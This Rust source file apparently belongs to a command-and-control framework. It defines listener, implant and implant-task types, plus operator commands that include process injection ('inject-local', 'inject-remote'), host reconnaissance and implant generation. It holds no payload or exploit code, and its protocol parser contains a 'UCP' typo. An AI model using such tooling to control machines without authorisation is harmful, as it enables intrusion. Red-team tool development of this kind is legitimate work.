use std::any::Any;
use std::fmt::{self, Debug};
use std::net::{AddrParseError, IpAddr};
use std::num::ParseIntError;
use std::str::{Chars, FromStr};

use rusqlite::types::{FromSql, FromSqlError, FromSqlResult, ValueRef};
use rusqlite::Row;
use serde::{Deserialize, Serialize};

use crate::database;

#[derive(Serialize, Debug)]
pub struct HTTPListener {
    pub id: u16,
    pub protocol: ListenerProtocol,
    pub status: ListenerStatus,
    pub address: IpAddr,
    pub port: u16,
    pub host: String,
}

pub struct GenericImplant {
    pub id: u16,
    pub listener_id: u16,
    pub last_seen: u64,
    pub data: Box<dyn Any>,
}

pub struct ImplantTask {
    pub id: u64,
    pub implant_id: u16,
    pub command: String,
    pub datetime: u64,
    pub status: ImplantTaskStatus,
    pub output: Vec<u8>,
    pub command_data: Vec<u8>,
}

#[derive(Copy, Clone, Debug, Serialize, Deserialize)]
pub enum ListenerProtocol {
    TCP,
    UDP,
    HTTP,
    ICMP,
    DNS,
}

#[derive(Copy, Clone, Debug, Serialize, Deserialize)]
pub enum ListenerStatus {
    Created,
    Active,
    Suspended,
}

pub enum ListenerSignal {
    StopListener,
}

pub enum ImplantTaskStatus {
    Issued,
    Pending,
    Completed,
}

pub enum ImplantConnectionType {
    Pull,
    Push,
}

pub enum EnumImplantCommands {
    Back,
    Exit,
    Generate,
    Help,
    List,
    Interact,
    Kill,
    Remove,
    Sleep,
    Tasks,
}

pub enum EnumImplantTaskCommands {
    Back,
    Exit,
    Hostname,
    Info,
    ListFiles,
    Whoami,
    Addresses,
    Pwd,
    InjectLocal,
    InjectRemote,
    Tasks,
}

pub trait ManageSettings {
    fn show_settings(&self);
    fn set_option(&mut self, option: &str, value: &str) -> bool;
}

impl fmt::Display for ListenerStatus {
    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        let listener_status: &str = match *self {
            ListenerStatus::Created => "Created",
            ListenerStatus::Active => "Active",
            ListenerStatus::Suspended => "Suspended",
        };

        return f.write_str(listener_status);
    }
}

impl fmt::Display for ListenerProtocol {
    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        let protocol_type: &str = match *self {
            ListenerProtocol::TCP => "TCP",
            ListenerProtocol::UDP => "UDP",
            ListenerProtocol::HTTP => "HTTP",
            ListenerProtocol::ICMP => "ICMP",
            ListenerProtocol::DNS => "DNS",
        };

        return f.write_str(protocol_type);
    }
}

impl fmt::Display for ImplantTaskStatus {
    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        let task_status: &str = match *self {
            ImplantTaskStatus::Issued => "Issued",
            ImplantTaskStatus::Pending => "Pending",
            ImplantTaskStatus::Completed => "Completed",
        };

        return f.write_str(task_status);
    }
}

impl fmt::Display for EnumImplantTaskCommands {
    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        let command: &str = match *self {
            EnumImplantTaskCommands::Whoami => "whoami",
            EnumImplantTaskCommands::Pwd => "pwd",
            EnumImplantTaskCommands::InjectLocal => "inject-local",
            EnumImplantTaskCommands::InjectRemote => "inject-remote",
            EnumImplantTaskCommands::Hostname => "hostname",
            EnumImplantTaskCommands::Info => "info",
            EnumImplantTaskCommands::ListFiles => "ls",
            EnumImplantTaskCommands::Addresses => "addresses",
            EnumImplantTaskCommands::Tasks => "tasks",
            EnumImplantTaskCommands::Back => "back",
            EnumImplantTaskCommands::Exit => "exit",
        };

        return f.write_str(command);
    }
}

impl fmt::Display for EnumImplantCommands {
    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        let command: &str = match *self {
            EnumImplantCommands::Back => "back",
            EnumImplantCommands::Exit => "exit",
            EnumImplantCommands::Generate => "generate",
            EnumImplantCommands::Help => "help",
            EnumImplantCommands::List => "list",
            EnumImplantCommands::Interact => "interact",
            EnumImplantCommands::Kill => "kill",
            EnumImplantCommands::Remove => "remove",
            EnumImplantCommands::Sleep => "sleep",
            EnumImplantCommands::Tasks => "tasks",
        };

        return f.write_str(command);
    }
}

impl PartialEq<&str> for EnumImplantTaskCommands {
    fn eq(&self, other: &&str) -> bool {
        return *other == self.to_string();
    }
}

impl PartialEq<&str> for EnumImplantCommands {
    fn eq(&self, other: &&str) -> bool {
        return *other == self.to_string();
    }
}

impl FromStr for ListenerStatus {
    type Err = ();

    fn from_str(input: &str) -> Result<ListenerStatus, Self::Err> {
        match input {
            "Created" => Ok(ListenerStatus::Created),
            "Active" => Ok(ListenerStatus::Active),
            "Suspended" => Ok(ListenerStatus::Suspended),
            _ => Err(()),
        }
    }
}

impl FromStr for ListenerProtocol {
    type Err = ();

    fn from_str(input: &str) -> Result<Self, Self::Err> {
        match input {
            "TCP" => Ok(ListenerProtocol::TCP),
            "UCP" => Ok(ListenerProtocol::UDP),
            "HTTP" => Ok(ListenerProtocol::HTTP),
            "ICMP" => Ok(ListenerProtocol::ICMP),
            "DNS" => Ok(ListenerProtocol::DNS),
            _ => Err(()),
        }
    }
}

impl FromStr for EnumImplantCommands {
    type Err = ();

    fn from_str(input: &str) -> Result<Self, Self::Err> {
        match input {
            "back" => Ok(Self::Back),
            "exit" => Ok(Self::Exit),
            "generate" => Ok(Self::Generate),
            "help" => Ok(Self::Help),
            "interact" => Ok(Self::Interact),
            "kill" => Ok(Self::Kill),
            "list" => Ok(Self::List),
            "remove" => Ok(Self::Remove),
            "sleep" => Ok(Self::Sleep),
            _ => Err(()),
        }
    }
}

impl FromSql for ListenerProtocol {
    fn column_result(value: ValueRef<'_>) -> FromSqlResult<Self> {
        match value.as_str() {
            Ok(value_str) => match value_str {
                "TCP" => Ok(ListenerProtocol::TCP),
                "UDP" => Ok(ListenerProtocol::UDP),
                "HTTP" => Ok(ListenerProtocol::HTTP),
                "ICMP" => Ok(ListenerProtocol::ICMP),
                "DNS" => Ok(ListenerProtocol::DNS),
                _ => Err(FromSqlError::InvalidType),
            },
            Err(_) => Err(FromSqlError::InvalidType),
        }
    }
}

impl FromSql for ImplantTaskStatus {
    fn column_result(value: ValueRef<'_>) -> FromSqlResult<Self> {
        match value.as_str() {
            Ok(value_str) => match value_str {
                "Completed" => Ok(ImplantTaskStatus::Completed),
                "Issued" => Ok(ImplantTaskStatus::Issued),
                "Pending" => Ok(ImplantTaskStatus::Pending),
                _ => Err(FromSqlError::InvalidType),
            },
            Err(_) => Err(FromSqlError::InvalidType),
        }
    }
}

impl FromStr for ImplantTaskStatus {
    type Err = ();

    fn from_str(input: &str) -> Result<ImplantTaskStatus, Self::Err> {
        match input {
            "Issued" => Ok(ImplantTaskStatus::Issued),
            "Pending" => Ok(ImplantTaskStatus::Pending),
            "Completed" => Ok(ImplantTaskStatus::Completed),
            _ => Err(()),
        }
    }
}

impl HTTPListener {
    pub fn create(address: String, port: u16) -> Result<Self, Box<dyn std::error::Error>> {
        let ip_address: Result<IpAddr, AddrParseError> = address.parse::<IpAddr>();
        Ok(Self {
            address: ip_address?,
            host: String::from("localhost"),
            port: port,
            id: 0,
            protocol: ListenerProtocol::HTTP,
            status: ListenerStatus::Created,
        })
    }

    pub fn add_to_database(http_listener: Self) -> bool {
        return database::insert_http_listener(http_listener);
    }
}

impl ManageSettings for HTTPListener {
    fn show_settings(&self) {
        println!("+------------+----------------------+");
        println!("|  Property  |         Value        |");
        println!("+------------+----------------------+");

        let dict: [(&str, String); 4] = [
            ("Protocol", "HTTP".to_string()),
            ("Address", self.address.to_string()),
            ("Port", self.port.to_string()),
            ("Host", self.host.to_string()),
        ];

        for x in dict {
            println!("| {0:^10} | {1:<20} |", x.0, x.1)
        }

        println!("+------------+----------------------+");
    }

    fn set_option(&mut self, option: &str, value: &str) -> bool {
        let mut flag: bool = false;

        let option_lowercase = option.to_lowercase();
        let mut option_chars: Chars = option_lowercase.chars();
        let option_capitalized: String = match option_chars.next() {
            None => String::new(),
            Some(f) => f.to_uppercase().collect::<String>() + option_chars.as_str(),
        };

        // println!("[+] Setting option: {}", option_capitalized.as_str());
        match option_capitalized.as_str() {
            "Address" => {
                // println!("[+] Setting listener address to {}", value);

                let res: Result<IpAddr, AddrParseError> = value.parse::<IpAddr>();
                if !res.is_err() {
                    self.address = res.unwrap();
                    flag = true;
                }
            }
            "Port" => {
                // println!("[+] Setting listener port to {}", value);

                let res: Result<u16, ParseIntError> = value.parse::<u16>();
                if !res.is_err() {
                    let port: u16 = res.unwrap();
                    if port > 0 {
                        self.port = port;
                        flag = true;
                    }
                }
            }
            "Host" => {
                // println!("[+] Setting listener host to {}", value);

                if value.chars().count() <= 100 {
                    self.host = value.to_string();
                    flag = true;
                }
            }
            &_ => {}
        }

        return flag;
    }
}

impl TryFrom<&Row<'_>> for HTTPListener {
    type Error = rusqlite::Error;

    fn try_from(row: &Row<'_>) -> Result<Self, Self::Error> {
        match (
            row.get(0),
            row.get(1),
            row.get(2),
            row.get(3),
            row.get(4),
            row.get(5),
        ) {
            (
                Ok::<u16, _>(listener_id),
                Ok::<String, _>(listener_protocol),
                Ok::<String, _>(listener_status),
                Ok::<String, _>(ip_address_str),
                Ok::<u16, _>(listener_port),
                Ok::<String, _>(http_host),
            ) => match ip_address_str.parse::<IpAddr>() {
                Ok(ip_address) => Ok(HTTPListener {
                    id: listener_id,
                    protocol: match ListenerProtocol::from_str(&listener_protocol) {
                        Ok(v) => v,
                        Err(_) => return Err(rusqlite::Error::InvalidQuery),
                    },
                    status: match ListenerStatus::from_str(&listener_status) {
                        Ok(v) => v,
                        Err(_) => return Err(rusqlite::Error::InvalidQuery),
                    },
                    address: ip_address,
                    port: listener_port,
                    host: http_host,
                }),
                Err(_) => Err(rusqlite::Error::InvalidQuery),
            },
            (_, _, _, _, _, _) => Err(rusqlite::Error::InvalidQuery),
        }
    }
}

impl TryFrom<&Row<'_>> for ImplantTask {
    type Error = rusqlite::Error;

    fn try_from(sql_row: &Row<'_>) -> Result<ImplantTask, rusqlite::Error> {
        match (
            sql_row.get(0),
            sql_row.get(1),
            sql_row.get(2),
            sql_row.get(3),
            sql_row.get(4),
            sql_row.get(5),
            sql_row.get(6),
        ) {
            (
                Ok::<u64, _>(task_id),
                Ok::<u16, _>(task_implant_id),
                Ok::<String, _>(task_command),
                Ok::<u64, _>(task_datetime),
                Ok::<ImplantTaskStatus, _>(task_status),
                Ok::<Vec<u8>, _>(task_output),
                Ok::<Vec<u8>, _>(task_command_data),
            ) => {
                return Ok(ImplantTask {
                    id: task_id,
                    implant_id: task_implant_id,
                    command: task_command,
                    datetime: task_datetime,
                    status: task_status,
                    output: task_output,
                    command_data: task_command_data,
                });
            }
            (
                Ok::<u64, _>(task_id),
                Ok::<u16, _>(task_implant_id),
                Ok::<String, _>(task_command),
                Ok::<u64, _>(task_datetime),
                Ok::<ImplantTaskStatus, _>(task_status),
                _,
                _,
            ) => {
                return Ok(ImplantTask {
                    id: task_id,
                    implant_id: task_implant_id,
                    command: task_command,
                    datetime: task_datetime,
                    status: task_status,
                    output: vec![],
                    command_data: vec![],
                });
            }
            (_, _, _, _, _, _, _) => return Err(rusqlite::Error::InvalidQuery),
        };
    }
}
